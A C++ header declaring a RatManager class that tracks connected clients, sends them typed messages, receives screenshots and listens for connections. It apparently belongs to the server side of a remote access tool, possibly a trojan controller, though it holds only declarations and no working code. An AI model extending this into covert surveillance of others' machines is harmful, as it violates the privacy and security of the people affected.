#pragma once

#include <mutex>
#include <vector>

#include "ClientPipe.h"
#include "ICommunicationFactory.h"
#include "IConnectionListener.h"
#include "IRatManager.h"
#include "IThreadGuard.h"

class RatManager final : public IRatManager
{
public:
	explicit RatManager(
		ICommunicationFactory* factory,
		std::unique_ptr<IConnectionListener> server);

	~RatManager() override;

	[[nodiscard]] int GetClientCount() const override;

	[[nodiscard]] ClientInfo* GetClients() override;

	void Send(int client, MessageType type, SharedSpan content) override;

	void Join() override;

private:
	void Listen();

	void OnDisconnection(int client);

	static std::string FormatDate(const std::chrono::system_clock::time_point time);

	static void OnScreenshot(SharedSpan content);

	static void OnMessage(
		int client,
		MessageType type,
		SharedSpan content);

	ICommunicationFactory* _factory;
	std::unique_ptr<IConnectionListener> _server;
	std::mutex _clientsLock;
	std::vector<std::shared_ptr<IClientPipe>> _clients;
	std::unique_ptr<IThreadGuard> _listenThread;
	int _clientCount;
	bool _isTerminationRequested;
};

